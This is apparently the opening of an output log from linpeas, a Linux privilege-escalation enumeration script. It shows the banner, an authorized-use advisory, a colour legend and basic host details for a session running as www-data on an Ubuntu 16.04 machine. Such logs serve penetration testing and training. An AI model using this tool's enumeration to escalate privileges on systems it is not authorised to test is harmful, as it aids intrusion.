         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------| 
    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter         :     @carlospolopm                           |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-132-generic (buildd@lgw01-amd64-030) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)) #136~16.04.1-Ubuntu SMP Tue Jan 12 18:18:45 UTC 2021
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: osboxes
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
